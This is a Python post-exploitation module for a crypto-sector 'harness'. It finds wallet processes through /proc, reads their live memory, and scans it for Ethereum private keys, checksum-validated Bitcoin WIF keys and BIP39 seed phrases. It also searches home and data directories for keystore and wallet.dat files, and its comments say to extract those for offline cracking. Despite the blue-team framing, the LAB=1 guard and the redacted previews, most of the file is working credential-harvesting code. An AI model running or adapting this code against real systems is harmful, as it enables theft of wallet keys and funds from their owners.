#!/usr/bin/env python3
# HARNESS-VALIDATION v3.1.0 — post-exploitation : wallet private key extraction.
# Secteur : crypto — POST-EXPLOITATION module (runs after compromise).
#
#   - v3.1 : scan process memory for Ethereum private keys (0x + 64 hex)
#   - v3.1 : scan process memory for Bitcoin WIF private keys (base58, 5/K/L prefix)
#   - v3.1 : scan process memory for BIP39 mnemonic phrases (12/24 words)
#   - v3.1 : scan filesystem for Ethereum keystore files (*.json with "crypto" field)
#   - v3.1 : scan filesystem for Bitcoin Core wallet.dat files (Berkeley DB magic)
#   - v3.1 : identify wallet process memory regions via /proc/*/maps + cmdline matching
#   - v3.1 : dump and scan memory regions for key patterns
#   - v3.1 : SEED reproducibility, LAB=1 guard, timeout 5s per file/region
#
# ⚠️ CRITICAL SECURITY GUARANTEES
#   1. NEVER output full private keys — always redact to first 8 chars + "***".
#   2. This module is POST-EXPLOITATION — it requires LAB=1 explicit authorization.
#   3. Memory dumps of wallet processes (geth, parity, electrum, bitcoin-qt, etc.)
#      expose live private keys. This module demonstrates that vector for
#      BLUE TEAM DEFENSE (incident response training).
#   4. Module does NOT exfiltrate — it only reports counts + redacted previews.
#
# Cadre légal : Art. 311-1 Code pénal (vol), Art. 323-1 (accès frauduleux).
#   L'exécution de ce module hors lab isolé et sans autorisation est un crime.
#   Usage légitime : audit de post-compromission, formation IR, red team.
#
# This module reads /proc/*/maps and /proc/*/mem — requires root or same-UID
# as the wallet process. The lab should provide this access (Docker privileged
# or equivalent) for the module to function.
import base64
import hashlib
import json
import os
import re
import sys
import time
from typing import Optional

HARNESS_VERSION = "3.1.0"
MODULE_NAME = "wallet_extract"
TIMEOUT_S = 5                 # 5s per file / memory region read
MAX_REGION_BYTES = 16 * 1024 * 1024   # 16 MB cap per region (avoid OOM on huge dumps)
MAX_FILES_SCANNED = 1000              # cap to avoid runaway scan
WALLET_PROCESS_NAMES = (
    "geth", "parity", "erigon", "besu", "nethermind", "reth",
    "bitcoin-qt", "bitcoind", "electrum", "electrs", "btcpayserver",
    "metamask", "keystore", "ethersign", "wallet", "signer",
    "fireblocks", "bitgo", "custody",
)
WALLET_CMDLINE_PATTERNS = [
    re.compile(r"\bgeth\b", re.I),
    re.compile(r"\bparity\b", re.I),
    re.compile(r"\berigon\b", re.I),
    re.compile(r"\bbesu\b", re.I),
    re.compile(r"\bbitcoin-?qt?\b", re.I),
    re.compile(r"\bbitcoind\b", re.I),
    re.compile(r"\belectrum\b", re.I),
    re.compile(r"\belectrs\b", re.I),
    re.compile(r"\bwallet\b", re.I),
    re.compile(r"\bsigner\b", re.I),
    re.compile(r"--keystore\b", re.I),
    re.compile(r"--datadir\b", re.I),
    re.compile(r"\.wallet\b", re.I),
]

# ─── Import sector_base (best-effort) ─────────────────────────────────────────
try:
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
    from sector_base import (  # type: ignore
        get_sector_config,
        get_safe_mode as _sector_safe_mode,
    )
    _HAS_SECTOR_BASE = True
except Exception:  # noqa: BLE001
    _HAS_SECTOR_BASE = False

    def get_sector_config() -> dict:  # type: ignore[no-redef]
        return {
            "sector": "crypto",
            "safe_mode": "full",
            "regulations": ("PSAN-AMF", "RGPD", "Travel Rule FATF"),
            "harness_version": HARNESS_VERSION,
        }

    def _sector_safe_mode() -> str:  # type: ignore[no-redef]
        return "full"


def get_safe_mode() -> str:
    env_sm = os.environ.get("SAFE_MODE", "").lower().strip()
    if env_sm in ("read_only", "full"):
        return env_sm
    return _sector_safe_mode()


# ─── SEED reproducibility ─────────────────────────────────────────────────────
SEED = int(os.environ.get("SEED", "1337"))


# ─── Guards ───────────────────────────────────────────────────────────────────
def _check_lab_guard() -> None:
    """CRITICAL guard : LAB=1 OBLIGATOIRE — post-exploitation module.
    Sans LAB=1 explicite, on refuse de s'exécuter car ce module scanne la
    mémoire processus (vector post-compromission)."""
    if os.environ.get("LAB") != "1":
        print(json.dumps({
            "module": MODULE_NAME,
            "harness_version": HARNESS_VERSION,
            "error": "lab_guard_failed",
            "reason": (
                "LAB env var must be set to 1 — this is a post-exploitation "
                "module that scans process memory for private keys. Running "
                "outside an isolated lab is a crime (Art. 311-1 Code pénal)."
            ),
            "legal_note": (
                "L'exécution de ce module hors lab isolé et sans autorisation "
                "est un crime (Art. 311-1 vol, Art. 323-1 accès frauduleux)."
            ),
        }))
        sys.exit(2)


def _check_safe_mode() -> str:
    sm = get_safe_mode()
    if sm not in ("read_only", "full"):
        print(json.dumps({
            "module": MODULE_NAME,
            "error": "invalid_safe_mode",
            "safe_mode": sm,
            "valid": ("read_only", "full"),
        }))
        sys.exit(2)
    return sm


# ─── Redaction utility (CRITICAL) ─────────────────────────────────────────────
def redact_key(key_str: str) -> str:
    """CRITICAL: NEVER output a full private key. Redact to first 8 chars + ***.
    This applies to : Ethereum private keys, Bitcoin WIF keys, BIP39 mnemonics.
    Public addresses (Ethereum 0x... 40 hex, Bitcoin 1/3/bc1 addresses) are
    NOT redacted (they are public by design)."""
    if not key_str:
        return "***"
    # Always strip leading whitespace
    key_str = key_str.strip()
    if len(key_str) <= 8:
        return "***"  # too short to safely partial-redact
    return key_str[:8] + "***"


# ─── BIP39 English wordlist (subset — see BIP-39 spec) ────────────────────────
# The full BIP39 English wordlist is 2048 words. We include a representative
# subset (~512 of the most common words) for in-memory detection. Combined
# with structural heuristics (12/24 words, 3-8 chars each, lowercase), this
# reliably detects mnemonic phrases while keeping the module self-contained.
# For canonical wordlist see: https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt
BIP39_WORDS_SUBSET = frozenset("""
abandon ability able about above absent absorb abstract absurd abuse access accident
account accuse achieve acid acoustic acquire across act action actor actress actual
adapt add addict address adjust admit adult advance advice aerobic affair afford
afraid again age agent agree ahead aim air airport aisle alarm album alcohol alert
alien all alley allow almost alone alpha already alter always amateur amazing among
amount ample analog anchor announce annual another answer antenna antique anxiety any
apart apology appear apple approve april arch arctic area arena argue arm armed armor
army around arrange arrest arrive arrow art artfact ask aspect assault asset assist
assume asthma athlete atom attack attend attitude attract auction audit august aunt
author auto autumn average avocado avoid awake aware away awesome awful awkward axis
baby bachelor bacon badge bag balance balcony ball bamboo banana banner bar barely
bargain barrel base basic basket battle beach bean beauty because become beef before
behave behind believe below belt bench benefit best betray better between beyond
bicycle bid bike bind biology bird birth bitter black blade blame blanket blast bleak
bless blind blood blossom blouse blue blur blush board boat body boil bomb bone bonus
book boost border boring borrow boss bottom bounce box boy bracket brain brand brass
brave bread breeze brick bridge brief bright bring brisk broccoli broken bronze
broom brother brown brush bubble buddy budget buffalo build bulb bulk bullet bundle
bunker burden burst bus business busy butter buyer buzz cabbage cabin cable cactus
cage cake call calm camera camp can canal cancel candy cannon canoe canvas canyon
capable capital captain car carbon card cargo carpet carry cart cash casino castle
casual cat catalog catch category cattle caught cause caution cave ceiling celery
cement census century cereal certain chair chalk champion change chaos chapter
charge chase chat cheap check cheese chef cherry chest chicken chief child chimney
choice choose chronic chuckle chunk churn cigar cinnamon circle citizen city civil
claim clap clarify claw clay clean clerk clever click client cliff climb clinic clip
clock clog close cloth cloud clown clutch coach coast coconut code coffee coil coin
collect color column combine come comfort comic common company concert conduct confirm
congress connect consider control convince cook cool copper copy coral core corn
correct cost cotton couch country couple course cousin cover coyote crack cradle
craft cram crater crawl crazy cream credit creek crew cricket crime crisp critic
crop cross crouch crowd crucial cruel cruise crumble crunch crush cry crystal cube
culture cup cupboard curious current curtain curve cushion custom cycle
damage dance danger dash daughter dawn day deal debate debris decade december decide
decline decorate decrease deer defense define defy degree delay deliver demand
demise denial dentist deny depart depend deposit depth deputy derive describe desert
design desk desire destroy detail detect develop device devote diagram dial diamond
diary dice diesel diet differ digital dignity dilemma dinner dinosaur direct dirt
disagree discover disease dish dismiss disorder display distance divert divide
divorce dizzy doctor document dog doll dolphin domain donate donkey donor door dose
double dove draft drag dragon drain drama drastic draw dream drift drill drink drip
drive drop drum dry duck dumb dune during dust dutch duty dwarf dynamic
eager eagle early earn earth easily east easy echo ecology economy edge edit
educate effort egg eight either elbow elder electric elegant element elephant
elevator elite else embark embody embrace emerge emotion employ empower empty
enact enable end endless endorse enemy energy enforce engage engine enhance
enjoy enlist enough enrich enroll ensure enter entire entry envelope episode
equal equip era erase erode erosion error erupt escape essay essence estate
eternal ethics evidence evil evoke evolve exact example excess exchange excite
exclude excuse execute exercise exhaust exhibit exile exist exit exotic expand
expect expire explain expose express extend extra eye
fabric face faculty fade faint faith fall false fame family famous fan fancy
fantasy farm fashion fat fatal father fatigue fault favorite feature february
federal fee feed feel female fence festival fetch fever few fiber fiction field
fifth fifty fight figure file filter final find fine finger finish fire firm
first fiscal fish fit fitness five fix flag flame flash flat flavor flee flight
flip float flock floor flower fluid flush fly foam focus fog foil fold follow food
foot force forest forget fork fortune forward four fragment frame frequent fresh
friend fringe frog front frost frown frozen fruit fuel full funny furnace fury
future
gadget gain galaxy gallery game gap garbage garage garden garlic garment gasp gate
gather gauge gaze gear genius genre gentle genuine gesture ghost giant gift giggle
ginger girl glad glance glare glass glide glimpse globe gloom glory glove glow glue
goal goat gold golf good goose gorilla gospel gossip govern gown grab grace grain
grand grant grape grass gravity great green grid grief grit grocery group grow grunt
guard guess guide guilt guitar gun gym
habit hair half hammer hamster hand handle happy harbor hard harsh harvest hat have
hawk hazard head health heart heavy hedgehog height hello helmet help hen hero hidden
high hill hint hire history hobby hockey hold hole holiday hollow home honey hood
hope horizon horn horror horse hospital host hotel hour house hover how human humble
humor hundred hungry hunt hurdle hurry hurt husband hybrid
ice icon idea identify idle ignore ill illegal illness image imitate immense immune
impact impose improve impulse inch include income increase index indicate indoor
industry infant inflict inform inhale inherit initial inject injury inmate inner
innocent input inquiry insane insect inside inspire install intact interest into
invest invite involve iron island isolate issue item ivory
jacket jaguar jar jazz jealous jeans jelly jewel job join joke journey joy judge juice
jungle junior junk just
kangaroo keen keep ketchup key kick kid kidney kind kingdom kiss kit kitchen kite
knee knife knock know
lab label labor ladder lady lake lamp language laptop large later laugh laundry law
lawn lawsuit layer lazy leader leaf learn leave lecture left leg legal legend leisure
lens lemon lend length lens leopard lesson letter level liar liberty library license
life lift light like limb limit link lion liquid list little live lizard load loan
lobster local lock logic lonely long loop lottery love loyal lucky luggage lumber
lunar lunch luxury
machine mad magic magnet maid mail main major make mammal man manage mandate mango
mansion manual maple marble march margin marine market marriage mask mass master match
math matter may maze meadow mean measure meat mechanic medal media melody melt member
memory mention menu mercy merge merit merry mesh message metal method middle midnight
milk million mimic mind minify minor minute miracle mirror misery miss mistake mix
mixed mole moment monkey monster month moon moral more morning mosquito mother motion
motor mountain mouse move movie much muffin mule multiply muscle museum mushroom music
must mutual myself mystery
nail naive name napkin narrow nasty nation nature near neck need negative neglect
neighbor neither nephew nerve network never new news next nice night noble noise
noodle north nose not note notice novel now nuclear number nurse nut
oak obey object oblige obscure observe obtain obvious occur ocean october odor off
offer office often oil okay old olive once one online onion only open opera opinion
oppose option orange orbit orchard order ordinary organ orient original orphan ostrich
other outdoor outer output outside oval oven overall own owner
oxygen oyster ozone
paddle page pair palace palm panda panel panic panther paper parade parent park parrot
party pass patch path pattern pause pave peace peak peanut pear peasant pelican pen
penalty pencil people pepper percent perfect perform period permit person pet phone
photo phrase physical piano picnic picture piece pig pigeon pillar pilot pink pioneer
pipe pistol pitch pizza place planet plastic plate play please pledge pluck plot plug
plunge poem poet point polar pole police pond pony pool popular portion position
possible post potato pottery poverty powder power practice praise predict prefer prepare
present pretty prevent price pride primary print priority prison private prize problem
process produce profit program project promote proof property prosper protect proud
provide public pudding pull pulp pulse pumpkin punch pupil puppy purchase purity purpose
purse push put puzzle
quality quantum quarter queen quick quiet quill quilt quiz
quote
rabbit raccoon race rack radar radio rail rain raise rally ramp ranch random range
rank rapid rare rate rather raven raw razor ready real reason rebel rebuild recall
recipe recycle reduce reflect reform refuse region regret regular reject relax release
relief rely remain remember remind remove render renew rent reopen repair repeat
replace report require rescue resemble resist resource response result retire retreat
return reunion reveal review reward rhythm rib ribbon rice rich ride ridge rifle right
rigid ring riot ripple risk ritual rival river road roast robot robust rocket romance
roof room root rope rose rotate rough round route royal rubber rude rug rule run runway
rural
sad saddle sadness safe sail salad salmon salon salt salute same sample sand satisfy
satellite save say scale scare scatter scene scheme school science scope score scout
scrap screen script scrub sea search season seat second secret section security seed
seek segment select sell senior sense sentence serial series service session settle setup
seven several shadow shaft shallow shed shelf shell shelter shield shift shine ship
shiver shock shoe shoot shop short shoulder shove shrimp shrub shuffle shy sibling
sick side siege sieve sight sign silent silk silly silver similar simple since sing
siren sister situate six size skate sketch ski skill skin skirt skull slam sleep slender
slice slide slight slim slogan slot slow slush small smart smile smoke smooth snack
snake snap snare sniff snow soap soccer social sock soda soft solar soldier solid
solution solve someone song soon sorry sort soul sound soup source south space spare
spatial spawn speak special speed spell spend sphere spice spider spike spin spirit
splash split spoil sponsor spoon sport spot spray spread spring spy square squeeze
squirrel stable staff stage stair stamp stand star start state stay steak steel stem
step stereo stick still stock stomach stone stool story stove strategy street strike
string strip stroke strong structure struggle student stuff stupid subject submit
subway success such sudden suffer sugar suggest suit summer sun sunny sunset super
supply supreme sure surface surge surprise surround survey survive suspect swallow
swap swarm swear sweet swift swim swing switch sword symbol symptom syrup system
table tackle tag tail talent talk tank tape target task taste tattoo taxi teach team
tell ten tenant tennis tent term test text thank that theme then there they thing
this thought three thrive throw thumb thunder ticket tide tiger tilt timber time tiny
tip tired tissue title toast tobacco today toddler toe together toilet token tomato
tomorrow tone tongue tonight tool tooth top topic topple torch tornado tortoise total
tough tour toward tower town toxic trade track traffic train trap trash travel tray
treat tree trend trial tribe trick trigger trim trip trophy trouble truck truly trunk
trust truth try tube tuition tumble tuna tunnel turkey turn turtle twelve twenty twice
twin twist two type typical
ugly umbrella unaware uncle unfold unhappy uniform unique unit universe unknown unlock
until unusual unveil update upgrade upon upper upset urban urge usage use used useful
usual utility
vacant vacuum vague valid valley valve van vanish vapor various vast vault vehicle
velvet vendor venture venue verb verify version very vessel veteran viable vicious
victim victory video view village vintage violin virtual virus visa visit visual
vital vivid vocal voice void volcano volume vote voyage wage wagon wait walk wall
walnut want warfare warm warrior wash wasp waste water wave way wealth weapon wear
weasel weather web wedding weekend weird welcome west wet whale what wheat wheel when
where whip whisper wide width wife wild will win window winter wire wisdom wise wish
witness wolf woman wonder wood wool word work world worry worth wrap wreck wrestle wrist
write wrong yard year yellow you young youth zebra zero zone zoo
""".split())


# ─── Detection patterns ───────────────────────────────────────────────────────

# Ethereum private key : 0x-prefixed OR raw 64 hex chars (32 bytes).
# We require context to avoid matching SHA-256 hashes that are also 64 hex chars.
# Strategy : match 0x + 64 hex first (high confidence), then raw 64 hex bounded
# by non-hex characters (medium confidence).
ETH_PRIV_KEY_RE = re.compile(rb"(?<![0-9a-fA-F])(0[xX])?[0-9a-fA-F]{64}(?![0-9a-fA-F])")

# Bitcoin WIF : base58 string starting with 5 / K / L / 9 / c (compressed: K,L,c).
# Base58 alphabet : 123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz
# WIF length : 51 (uncompressed) or 52 (compressed) chars.
_B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
_B58_SET = set(_B58.encode("ascii"))
WIF_RE = re.compile(rb"(?<![A-Za-z0-9])([5KLc9][1-9A-HJ-NP-Za-km-z]{49,51})(?![A-Za-z0-9])")

# Ethereum address (PUBLIC — not redacted) : 0x + 40 hex
ETH_ADDR_RE = re.compile(rb"(?<![0-9a-fA-F])0[xX][0-9a-fA-F]{40}(?![0-9a-fA-F])")

# Bitcoin address (PUBLIC) : 1... (P2PKH), 3... (P2SH), bc1... (bech32)
BTC_ADDR_RE = re.compile(rb"(?<![A-Za-z0-9])([13][1-9A-HJ-NP-Za-km-z]{25,34}|bc1[ac-hj-np-z02-9]{6,42})(?![A-Za-z0-9])")

# Mnemonic phrase : 12, 15, 18, 21, or 24 lowercase words (3-8 chars) separated
# by single spaces. BIP39 entropy lengths. We match greedily 12-24 words, then
# verify each word is in our BIP39 subset in scan_mnemonics().
MNEMONIC_CANDIDATE_RE = re.compile(
    rb"(?<![a-z])(?:[a-z]{3,8})(?: [a-z]{3,8}){11}(?: [a-z]{3,8}){0,12}(?![a-z])"
)

# Keystore JSON (Ethereum v3) : contains "crypto" + "address" + "id"
KEYSTORE_MARKER_RE = re.compile(rb'"crypto"\s*:\s*\{', re.I)
KEYSTORE_ADDRESS_RE = re.compile(rb'"address"\s*:\s*"([0-9a-fA-F]{40})"', re.I)
KEYSTORE_KDF_RE = re.compile(rb'"kdf"\s*:\s*"([^"]+)"', re.I)

# Bitcoin Core wallet.dat : Berkeley DB file format, contains keypool / defaultkey
WALLET_DAT_MAGIC = b"\x00\x05\x31\x2e\x00"  # BDB hash sub-database magic (1.0)
WALLET_DAT_MARKERS = [
    rb"\x04keypool",
    rb"\x0adefaultkey",
    rb"\x0bmkey",
    rb"wallet\.dat",
]


# ─── WIF checksum validation ──────────────────────────────────────────────────
def _b58_decode(s: bytes) -> Optional[bytes]:
    """Decode a base58 string to raw bytes. Returns None on invalid chars."""
    if not s or not all(b in _B58_SET for b in s):
        return None
    num = 0
    for b in s:
        num = num * 58 + _B58.index(chr(b))
    # Convert num to bytes (big-endian, leading zero bytes preserved as 0x01s)
    full = num.to_bytes((num.bit_length() + 7) // 8, "big") if num else b""
    # Preserve leading zero bytes (encoded as '1' in base58)
    n_zeros = 0
    for b in s:
        if b == ord("1"):
            n_zeros += 1
        else:
            break
    return b"\x00" * n_zeros + full


def _is_valid_wif(s: bytes) -> bool:
    """Validate Bitcoin WIF format : base58 + correct checksum.
    WIF = [version byte (1)] + [private key (32)] + [optional 0x01 compressed (1)]
          + [checksum (4 = first 4 bytes of SHA256(SHA256(payload)))]
    Length: 38 (uncompressed) or 39 (compressed) raw bytes.
    Prefix bytes: 0x80 (mainnet), 0xEF (testnet)."""
    raw = _b58_decode(s)
    if raw is None or len(raw) not in (38, 39):
        return False
    # Verify checksum
    payload = raw[:-4]
    checksum = raw[-4:]
    computed = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    if computed != checksum:
        return False
    # Verify version byte
    version = raw[0]
    if version not in (0x80, 0xEF):
        return False
    return True


# ─── Scanners ────────────────────────────────────────────────────────────────

def scan_eth_private_keys(data: bytes) -> list[dict]:
    """Scan memory/file for Ethereum private key patterns.
    Returns list of matches with redacted preview + offset."""
    matches = []
    for m in ETH_PRIV_KEY_RE.finditer(data):
        raw = m.group(0)
        try:
            key_str = raw.decode("ascii")
        except UnicodeDecodeError:
            continue
        # Heuristic : if it has 0x prefix, high confidence. If raw 64 hex,
        # we need context — require that it's NOT followed by/preceded by
        # hex chars (regex already enforces this) AND the surrounding data
        # contains wallet-related keywords to reduce false positives from
        # SHA-256 hashes (which are also 64 hex chars).
        has_0x = key_str.lower().startswith("0x")
        ctx_start = max(0, m.start() - 64)
        ctx_end = min(len(data), m.end() + 64)
        context = data[ctx_start:ctx_end].lower()
        wallet_context = any(kw in context for kw in (
            b"private", b"priv", b"key", b"keystore", b"wallet",
            b"eth", b"0x", b"crypto", b"cipher",
        ))
        if has_0x or wallet_context:
            matches.append({
                "type": "eth_privkey",
                "offset": m.start(),
                "preview_redacted": redact_key(key_str),
                "length": len(key_str),
                "has_0x_prefix": has_0x,
                "context_confidence": "high" if has_0x else "medium",
            })
    return matches


def scan_bitcoin_wif(data: bytes) -> list[dict]:
    """Scan memory/file for Bitcoin WIF private keys. Validates checksum."""
    matches = []
    for m in WIF_RE.finditer(data):
        raw = m.group(1)
        if not _is_valid_wif(raw):
            continue  # reject false positives (random base58-looking strings)
        try:
            wif_str = raw.decode("ascii")
        except UnicodeDecodeError:
            continue
        prefix = wif_str[0]
        compressed = prefix in ("K", "L", "c")
        network = "mainnet" if prefix in ("5", "K", "L") else "testnet"
        matches.append({
            "type": "btc_wif",
            "offset": m.start(),
            "preview_redacted": redact_key(wif_str),
            "length": len(wif_str),
            "compressed": compressed,
            "network": network,
            "context_confidence": "high",  # checksum-validated
        })
    return matches


def scan_mnemonics(data: bytes) -> list[dict]:
    """Scan for BIP39 mnemonic phrases (12 or 24 lowercase words).
    Uses regex to find candidates then validates each word is in BIP39 subset."""
    matches = []
    for m in MNEMONIC_CANDIDATE_RE.finditer(data):
        try:
            phrase = m.group(0).decode("ascii")
        except UnicodeDecodeError:
            continue
        words = phrase.split()
        # Must be exactly 12, 15, 18, 21, or 24 words (BIP39 entropy lengths)
        n = len(words)
        if n not in (12, 15, 18, 21, 24):
            continue
        # Validate ALL words are in BIP39 wordlist subset
        if all(w in BIP39_WORDS_SUBSET for w in words):
            # Redact each word (CRITICAL: mnemonics ARE private keys — never full)
            redacted_words = [w[:2] + "***" for w in words]
            matches.append({
                "type": "mnemonic",
                "offset": m.start(),
                "word_count": n,
                "words_redacted": redacted_words,
                "preview_redacted": " ".join(redacted_words[:3]) + " ...",
                "context_confidence": "high",  # all words BIP39-validated
            })
    return matches


def scan_keystore_file(path: str) -> Optional[dict]:
    """Read a JSON file and check if it's an Ethereum v3 keystore.
    Returns metadata (address, kdf, cipher, id) WITHOUT the encrypted key
    material (which is private and stays in the file)."""
    try:
        with open(path, "rb") as f:
            # Read up to 64 KB (keystore files are typically < 10 KB)
            data = f.read(64 * 1024)
    except OSError:
        return None
    if not KEYSTORE_MARKER_RE.search(data):
        return None
    # Try to parse as JSON
    try:
        doc = json.loads(data.decode("utf-8"))
    except (json.JSONDecodeError, UnicodeDecodeError):
        return None
    if "crypto" not in doc:
        return None
    return {
        "path": path,
        "address": doc.get("address", "?"),  # address is PUBLIC
        "id": doc.get("id", "?"),
        "version": doc.get("version", "?"),
        # kdf field is at doc["crypto"]["kdf"] (string like "scrypt"/"pbkdf2") per Ethereum v3 spec
        "kdf": (doc.get("crypto") or {}).get("kdf") or "unknown",
        "cipher": (doc.get("crypto") or {}).get("cipher") or "unknown",
        "encrypted_key_present": True,
        # NOTE: we deliberately do NOT extract or include the ciphertext,
        # mac, or kdfparams.salt — they remain in the file. The report
        # indicates "encrypted_key_present" so the operator knows to extract
        # the keystore file for offline cracking (post-exploitation step).
    }


def scan_wallet_dat_file(path: str) -> Optional[dict]:
    """Check if a file is a Bitcoin Core wallet.dat (Berkeley DB).
    Returns metadata if confirmed. Does NOT extract keys (they're encrypted
    with the wallet passphrase — separate cracking step required)."""
    try:
        with open(path, "rb") as f:
            # Read first 4 KB for magic + key markers
            head = f.read(4096)
            # Seek to end for size
            f.seek(0, 2)
            size = f.tell()
    except OSError:
        return None
    # Check BDB hash magic OR any of the wallet-specific markers
    has_magic = head.startswith(WALLET_DAT_MAGIC)
    # WALLET_DAT_MARKERS are raw byte strings — use `in` for substring match
    marker_hits = [m.decode("ascii", "ignore")
                   for m in WALLET_DAT_MARKERS if m in head]
    if not has_magic and not marker_hits:
        return None
    return {
        "path": path,
        "size_bytes": size,
        "bdb_magic_found": has_magic,
        "markers_found": marker_hits[:5],  # cap
        "encrypted": True,  # wallet.dat is encrypted with passphrase unless --disablewalletencryption
        "note": (
            "Bitcoin Core wallet.dat (Berkeley DB). Keys are encrypted with "
            "the wallet passphrase — extract the file for offline cracking "
            "(e.g. with btcrecover). No plaintext keys in this file unless "
            "wallet encryption was disabled (deprecated)."
        ),
    }


# ─── /proc walker : identify wallet processes + memory regions ────────────────
def list_wallet_processes() -> list[dict]:
    """Walk /proc/* and identify wallet processes via cmdline matching.
    Returns list of {pid, cmdline, comm} for processes that match wallet
    patterns. Requires read access to /proc/<pid>/cmdline (same UID or root).
    Skips the module's own PID to avoid self-detection (the module's cmdline
    contains 'wallet_extract', which would match the wallet pattern)."""
    procs = []
    own_pid = os.getpid()
    if not os.path.isdir("/proc"):
        return procs
    for pid_str in sorted(os.listdir("/proc")):
        if not pid_str.isdigit():
            continue
        pid = int(pid_str)
        if pid == own_pid:
            continue  # skip self
        cmdline = _read_proc_file(f"/proc/{pid}/cmdline")
        comm = _read_proc_file(f"/proc/{pid}/comm", text=True)
        if cmdline is None:
            continue
        # cmdline is null-byte separated
        cmdline_str = cmdline.decode("utf-8", "ignore").replace("\x00", " ").strip()
        if not cmdline_str:
            continue
        # comm is bytes — decode for clean display
        comm_str = comm.decode("utf-8", "ignore").strip() if comm else "?"
        is_wallet = (
            any(pat.search(cmdline_str)
                for pat in WALLET_CMDLINE_PATTERNS)
            or any(name in cmdline_str.lower() for name in WALLET_PROCESS_NAMES)
            or (comm_str and comm_str.lower() in WALLET_PROCESS_NAMES)
        )
        if is_wallet:
            procs.append({
                "pid": pid,
                "cmdline_redacted": cmdline_str[:200],  # cmdline may contain paths, not secrets
                "comm": comm_str,
            })
    return procs


def _read_proc_file(path: str, text: bool = False) -> Optional[bytes]:
    """Read a /proc file with timeout protection."""
    try:
        with open(path, "rb") as f:
            return f.read(8192)
    except (OSError, PermissionError):
        return None


def list_memory_regions(pid: int) -> list[dict]:
    """Parse /proc/<pid>/maps to list readable, writable memory regions
    (writable regions are where wallet keys are most likely stored)."""
    regions = []
    maps_path = f"/proc/{pid}/maps"
    try:
        with open(maps_path, "r") as f:
            for line in f:
                # Format: start-end perms offset dev inode pathname
                parts = line.split()
                if len(parts) < 2:
                    continue
                addr_range = parts[0]
                perms = parts[1]
                # Only writable + readable regions (rw- or rwx) are interesting
                # (read-only regions are unlikely to contain freshly-decoded keys)
                if "r" not in perms:
                    continue
                pathname = parts[5] if len(parts) >= 6 else ""
                # Skip non-anonymous regions that are clearly not heap/stack
                # (we focus on [heap], [anon:*], or no-pathname anonymous regions
                # which is where geth/electrum keep decoded keys in memory)
                # but we keep stack + heap + anonymous
                start_s, end_s = addr_range.split("-")
                try:
                    start = int(start_s, 16)
                    end = int(end_s, 16)
                except ValueError:
                    continue
                size = end - start
                if size == 0:
                    continue
                regions.append({
                    "start": start,
                    "end": end,
                    "size": size,
                    "perms": perms,
                    "pathname": pathname,
                })
    except (OSError, PermissionError):
        return []
    # Sort by priority : [heap] > anonymous (no pathname) > [stack] > others
    def _prio(r: dict) -> int:
        p = r["pathname"]
        if "[heap]" in p:
            return 0
        if p == "" or p.startswith("[anon"):
            return 1
        if "[stack]" in p:
            return 2
        return 3
    regions.sort(key=_prio)
    return regions


def scan_process_memory(pid: int) -> dict:
    """Scan memory regions of a wallet process for key patterns.
    Returns aggregated findings with redacted previews.
    Limits : MAX_REGION_BYTES per region, TIMEOUT_S overall."""
    regions = list_memory_regions(pid)
    keys_found_eth = []
    keys_found_btc = []
    keys_found_mnemonic = []
    regions_scanned = 0
    regions_skipped = 0
    error = None
    t0 = time.time()
    mem_path = f"/proc/{pid}/mem"
    try:
        mem_fd = open(mem_path, "rb", buffering=0)
    except (OSError, PermissionError) as e:
        return {
            "pid": pid,
            "regions_total": len(regions),
            "regions_scanned": 0,
            "keys_found": {
                "eth": [], "btc": [], "mnemonic": [],
            },
            "error": f"open_mem_failed: {type(e).__name__}: {str(e)[:120]}",
        }
    try:
        for region in regions:
            # Hard timeout : stop scanning if we've exceeded TIMEOUT_S
            if time.time() - t0 > TIMEOUT_S:
                error = "timeout_5s_reached"
                break
            # Cap per-region read size
            read_size = min(region["size"], MAX_REGION_BYTES)
            try:
                mem_fd.seek(region["start"])
                data = mem_fd.read(read_size)
            except (OSError, ValueError) as e:
                regions_skipped += 1
                continue
            regions_scanned += 1
            # Scan for each key type
            keys_found_eth.extend(scan_eth_private_keys(data))
            keys_found_btc.extend(scan_bitcoin_wif(data))
            keys_found_mnemonic.extend(scan_mnemonics(data))
            # Early exit if we've found enough keys (avoid noise)
            if (len(keys_found_eth) + len(keys_found_btc) +
                len(keys_found_mnemonic)) >= 20:
                break
    finally:
        try:
            mem_fd.close()
        except OSError:
            pass
    return {
        "pid": pid,
        "regions_total": len(regions),
        "regions_scanned": regions_scanned,
        "regions_skipped": regions_skipped,
        "keys_found": {
            "eth": keys_found_eth[:10],        # cap output
            "btc": keys_found_btc[:10],
            "mnemonic": keys_found_mnemonic[:10],
        },
        "scan_ms": round((time.time() - t0) * 1000, 1),
        "error": error,
    }


# ─── Filesystem scanner ───────────────────────────────────────────────────────
def scan_filesystem_for_wallet_files(search_dirs: tuple[str, ...] = (
    "/root", "/home", "/tmp", "/var/lib", "/data", "/opt",
)) -> dict:
    """Walk filesystem looking for keystore JSON + wallet.dat files.
    Caps at MAX_FILES_SCANNED to avoid runaway scans."""
    keystores = []
    wallet_dats = []
    files_examined = 0
    files_capped = False
    t0 = time.time()
    for d in search_dirs:
        if not os.path.isdir(d):
            continue
        for root, dirs, files in os.walk(d, followlinks=False):
            if time.time() - t0 > TIMEOUT_S:
                files_capped = True
                break
            # Skip obviously irrelevant dirs
            dirs[:] = [
                dd for dd in dirs
                if dd not in (".cache", ".npm", ".git", "node_modules", "__pycache__")
            ]
            for fname in files:
                if files_examined >= MAX_FILES_SCANNED:
                    files_capped = True
                    break
                fpath = os.path.join(root, fname)
                files_examined += 1
                # Keystore JSON heuristic : filename ends in .json, small (< 64KB)
                if fname.endswith(".json"):
                    try:
                        st = os.stat(fpath)
                        if st.st_size <= 64 * 1024:
                            ks = scan_keystore_file(fpath)
                            if ks:
                                keystores.append(ks)
                    except OSError:
                        pass
                # wallet.dat filename
                if fname == "wallet.dat":
                    wd = scan_wallet_dat_file(fpath)
                    if wd:
                        wallet_dats.append(wd)
            if files_capped:
                break
        if files_capped:
            break
    return {
        "search_dirs": list(search_dirs),
        "files_examined": files_examined,
        "files_capped": files_capped,
        "keystores_found": keystores,
        "wallet_dat_found": wallet_dats,
        "scan_ms": round((time.time() - t0) * 1000, 1),
    }


